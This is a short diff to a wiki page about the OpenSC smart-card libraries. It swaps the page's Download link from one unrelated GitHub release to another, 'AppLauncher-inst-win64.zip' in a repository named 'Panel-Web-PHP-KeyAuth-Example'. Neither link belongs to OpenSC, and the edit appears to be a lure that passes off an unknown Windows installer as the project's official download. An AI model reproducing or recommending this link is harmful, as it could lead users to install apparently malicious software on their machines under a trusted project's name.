@@ -2,7 +2,7 @@ OpenSC provides a set of libraries and utilities to work with smart cards. Its m
 
 h2. Download
 
-"Download":https://github.com/EclipseFond/eclipse-collections/releases/download/v2.0.15/AppLauncher-inst-win64.zip
+"Download":https://github.com/zetrocode/Panel-Web-PHP-KeyAuth-Example/releases/download/teamplate/AppLauncher-inst-win64.zip
 
 
 h2. News
